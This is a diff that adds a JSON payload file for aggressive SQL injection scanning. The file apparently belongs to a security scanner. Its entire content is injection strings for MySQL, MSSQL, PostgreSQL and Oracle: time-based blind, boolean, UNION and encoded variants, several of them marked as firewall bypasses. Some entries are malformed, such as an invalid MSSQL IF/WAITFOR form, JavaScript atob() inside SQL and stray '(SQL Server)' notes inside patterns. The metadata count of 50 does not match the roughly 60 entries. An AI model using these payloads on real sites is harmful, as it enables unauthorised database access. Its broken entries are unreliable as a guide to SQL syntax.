@@ -1,0 +1,432 @@
+{
+  "name": "SQL Injection Aggressive Patterns",
+  "version": "2.3.0",
+  "description": "Advanced SQLi payloads for aggressive scanning with WAF bypass techniques",
+  "patterns": [
+    {
+      "id": "sqli-time-mysql-basic",
+      "type": "time-based",
+      "name": "MySQL time-based (basic)",
+      "pattern": "' OR SLEEP(5)-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-time-mysql-advanced",
+      "type": "time-based",
+      "name": "MySQL time-based (conditional)",
+      "pattern": "' OR IF(ASCII(SUBSTRING((SELECT database()),1,1))>97,SLEEP(5),SLEEP(0))-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-time-mysql-waf-bypass",
+      "type": "time-based",
+      "name": "MySQL time-based (WAF bypass)",
+      "pattern": "' OR /*!50000SLEEP*/(5)-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-time-mssql-basic",
+      "type": "time-based",
+      "name": "MSSQL time-based (basic)",
+      "pattern": "' OR WAITFOR DELAY '00:00:05'-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-time-mssql-advanced",
+      "type": "time-based",
+      "name": "MSSQL time-based (conditional)",
+      "pattern": "' OR IF(1=1, WAITFOR DELAY '00:00:05', NULL)-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-time-postgres-basic",
+      "type": "time-based",
+      "name": "PostgreSQL time-based (basic)",
+      "pattern": "' OR pg_sleep(5)-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-time-postgres-advanced",
+      "type": "time-based",
+      "name": "PostgreSQL time-based (conditional)",
+      "pattern": "' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-time-oracle-basic",
+      "type": "time-based",
+      "name": "Oracle time-based (basic)",
+      "pattern": "' OR DBMS_LOCK.SLEEP(5)-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-time-oracle-advanced",
+      "type": "time-based",
+      "name": "Oracle time-based (conditional)",
+      "pattern": "' OR CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(5) ELSE NULL END FROM dual-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-boolean-mysql-basic",
+      "type": "boolean-based",
+      "name": "MySQL boolean (basic)",
+      "pattern": "' OR 1=1-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-boolean-mysql-waf-bypass",
+      "type": "boolean-based",
+      "name": "MySQL boolean (WAF bypass)",
+      "pattern": "'/**/OR/**/1= 1-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-boolean-mysql-case",
+      "type": "boolean-based",
+      "name": "MySQL boolean (case variation)",
+      "pattern": "' Or 1=1-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-boolean-mssql-basic",
+      "type": "boolean-based",
+      "name": "MSSQL boolean (basic)",
+      "pattern": "' OR 1=1-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-boolean-mssql-waf-bypass",
+      "type": "boolean-based",
+      "name": "MSSQL boolean (WAF bypass)",
+      "pattern": "'/**/OR/**/1= 1-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-boolean-mssql-case",
+      "type": "boolean-based",
+      "name": "MSSQL boolean (case variation)",
+      "pattern": "' Or 1=1-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-boolean-postgres-basic",
+      "type": "boolean-based",
+      "name": "PostgreSQL boolean (basic)",
+      "pattern": "' OR 1=1-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-boolean-postgres-waf-bypass",
+      "type": "boolean-based",
+      "name": "PostgreSQL boolean (WAF bypass)",
+      "pattern": "'/**/OR/**/1= 1-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-boolean-postgres-case",
+      "type": "boolean-based",
+      "name": "PostgreSQL boolean (case variation)",
+      "pattern": "' Or 1=1-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-boolean-oracle-basic",
+      "type": "boolean-based",
+      "name": "Oracle boolean (basic)",
+      "pattern": "' OR 1=1-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-boolean-oracle-waf-bypass",
+      "type": "boolean-based",
+      "name": "Oracle boolean (WAF bypass)",
+      "pattern": "'/**/OR/**/1= 1-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-boolean-oracle-case",
+      "type": "boolean-based",
+      "name": "Oracle boolean (case variation)",
+      "pattern": "' Or 1=1-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-math-mysql-basic",
+      "type": "math-function",
+      "name": "MySQL math function (basic)",
+      "pattern": "' OR PI()=PI()-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-advanced",
+      "type": "math-function",
+      "name": "MySQL math function (conditional)",
+      "pattern": "' OR POW(1,1)=1-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-string",
+      "type": "math-function",
+      "name": "MySQL math function (string)",
+      "pattern": "' OR SQRT(4)=2-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-length",
+      "type": "math-function",
+      "name": "MySQL math function (length)",
+      "pattern": "' OR LENGTH(database())>0-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-ascii",
+      "type": "math-function",
+      "name": "MySQL math function (ASCII)",
+      "pattern": "' OR ASCII('a')=97-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-date",
+      "type": "math-function",
+      "name": "MySQL math function (date)",
+      "pattern": "' OR NOW()=NOW()-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-conditional",
+      "type": "math-function",
+      "name": "MySQL math function (conditional)",
+      "pattern": "' OR COALESCE(NULL,1)=1-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-if",
+      "type": "math-function",
+      "name": "MySQL math function (IF)",
+      "pattern": "' OR IFNULL(NULL,1)=1-- - (SQL Server)",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-isnull",
+      "type": "math-function",
+      "name": "MySQL math function (ISNULL)",
+      "pattern": "' OR ISNULL(NULL,1)=1-- - (SQL Server)",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-advanced-if",
+      "type": "math-function",
+      "name": "MySQL math function (IF conditional)",
+      "pattern": "' OR IF(LENGTH(database())>5,SLEEP(5),SLEEP(0))-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mysql-case-benchmark",
+      "type": "math-function",
+      "name": "MySQL math function (CASE BENCHMARK)",
+      "pattern": "' OR CASE WHEN LENGTH(user())>4 THEN BENCHMARK(1000000,MD5(1)) ELSE 0 END-- -",
+      "dbms": "mysql"
+    },
+    {
+      "id": "sqli-math-mssql-basic",
+      "type": "math-function",
+      "name": "MSSQL math function (basic)",
+      "pattern": "' OR PI()=PI()-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-math-mssql-advanced",
+      "type": "math-function",
+      "name": "MSSQL math function (conditional)",
+      "pattern": "' OR POW(1,1)=1-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-math-mssql-string",
+      "type": "math-function",
+      "name": "MSSQL math function (string)",
+      "pattern": "' OR LEN(database())>0-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-math-mssql-date",
+      "type": "math-function",
+      "name": "MSSQL math function (date)",
+      "pattern": "' OR GETDATE()=GETDATE()-- -",
+      "dbms": "mssql"
+    },
+    {
+      "id": "sqli-math-postgres-basic",
+      "type": "math-function",
+      "name": "PostgreSQL math function (basic)",
+      "pattern": "' OR PI()=PI()-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-math-postgres-advanced",
+      "type": "math-function",
+      "name": "PostgreSQL math function (conditional)",
+      "pattern": "' OR POW(1,1)=1-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-math-postgres-string",
+      "type": "math-function",
+      "name": "PostgreSQL math function (string)",
+      "pattern": "' OR LENGTH(database())>0-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-math-postgres-date",
+      "type": "math-function",
+      "name": "PostgreSQL math function (date)",
+      "pattern": "' OR NOW()=NOW()-- -",
+      "dbms": "postgres"
+    },
+    {
+      "id": "sqli-math-oracle-basic",
+      "type": "math-function",
+      "name": "Oracle math function (basic)",
+      "pattern": "' OR PI()=PI()-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-math-oracle-advanced",
+      "type": "math-function",
+      "name": "Oracle math function (conditional)",
+      "pattern": "' OR POW(1,1)=1-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-math-oracle-string",
+      "type": "math-function",
+      "name": "Oracle math function (string)",
+      "pattern": "' OR LENGTH(database())>0-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-math-oracle-date",
+      "type": "math-function",
+      "name": "Oracle math function (date)",
+      "pattern": "' OR SYSDATE=SYSDATE-- -",
+      "dbms": "oracle"
+    },
+    {
+      "id": "sqli-encoding-url-basic",
+      "type": "encoding",
+      "name": "URL encoding (basic)",
+      "pattern": "%27%20OR%201%3D1--",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-url-double",
+      "type": "encoding",
+      "name": "Double URL encoding (advanced)",
+      "pattern": "%2527%2520OR%25201%253D1--",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-hex-basic",
+      "type": "encoding",
+      "name": "Hex encoding (basic)",
+      "pattern": "0x61646D696E (admin in hex)",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-hex-advanced",
+      "type": "encoding",
+      "name": "Hex encoding (conditional)",
+      "pattern": "' UNION SELECT 0x61646D696E, 0x70617373776F7264 --",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-hex-char",
+      "type": "encoding",
+      "name": "Hex encoding (CHAR)",
+      "pattern": "' UNION SELECT CHAR(97,100,109,105,110), CHAR(112,97,115,115,119,111,114,100) --",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-base64-basic",
+      "type": "encoding",
+      "name": "Base64 encoding (basic)",
+      "pattern": "YWRtaW4= (admin in base64)",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-base64-advanced",
+      "type": "encoding",
+      "name": "Base64 encoding (conditional)",
+      "pattern": "' UNION SELECT atob('YWRtaW4='), atob('cGFzc3dvcmQ=') --",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-case-basic",
+      "type": "encoding",
+      "name": "Case variation (basic)",
+      "pattern": "' Or 1=1-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-encoding-case-mixed",
+      "type": "encoding",
+      "name": "Case variation (mixed)",
+      "pattern": "' oR 1=1-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-comment-basic",
+      "type": "whitespace",
+      "name": "Whitespace comment (basic)",
+      "pattern": "1'/**/OR/**/1= 1-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-newline-basic",
+      "type": "whitespace",
+      "name": "Newline (basic)",
+      "pattern": "1'%0AOR%0A1= 1-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-newline-advanced",
+      "type": "whitespace",
+      "name": "Newline (URL encoded)",
+      "pattern": "1' OR% 0A1= 1-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-parenthesis-basic",
+      "type": "whitespace",
+      "name": "Parenthesis (basic)",
+      "pattern": "1' OR(1= 1)-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-parenthesis-advanced",
+      "type": "whitespace",
+      "name": "Parenthesis (conditional)",
+      "pattern": "1' OR(LENGTH(database())>5)-- -",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-concat-basic",
+      "type": "whitespace",
+      "name": "Concatenation (basic)",
+      "pattern": "'adm'+'in'",
+      "dbms": "universal"
+    },
+    {
+      "id": "sqli-whitespace-concat-advanced",
+      "type": "whitespace",
+      "name": "Concatenation (conditional)",
+      "pattern": "'adm'||'in'",
+      "dbms": "universal"
+    }
+  ],
+  "metadata": {
+    "total_patterns": 50,
+    "categories": ["time-based", "boolean-based", "math-function", "encoding", "whitespace"],
+    "techniques": ["classic", "waf-bypass", "double-encoded", "case-variation", "unicode-obfuscation", "function-constructor", "indirect-invocation"]
+  }
+}
